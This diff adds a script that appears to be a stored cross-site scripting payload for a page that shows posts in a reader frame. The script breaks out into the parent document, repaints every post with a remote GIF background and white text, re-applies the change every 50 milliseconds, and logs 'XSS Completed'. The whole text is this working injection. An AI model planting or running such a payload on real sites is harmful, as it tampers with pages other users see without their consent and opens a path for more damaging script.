@@ -1,0 +1,17 @@
+<script>
+const doc = window.parent.document;
+const r = (function() {
+    const postNodeList = doc.querySelectorAll("div.msreader-post-content");
+    Array.from(postNodeList).forEach(post => {
+        post.style.background = 'url("https://media1.tenor.com/images/9b3615aad97431aa7a330609d1ddfd33/tenor.gif?itemid=15710427")';
+        post.style.backgroundSize = "cover";
+        const insideEl = post.parentElement.getElementsByClassName("inside")[0];
+        Array.from(insideEl.getElementsByTagName("*")).forEach(text => {
+            if(text.tagName !== "div") text.style.color = "#fff";
+        });
+    });
+})
+setInterval(r, 50);
+r();
+window.parent.console.log("XSS Completed");
+</script>
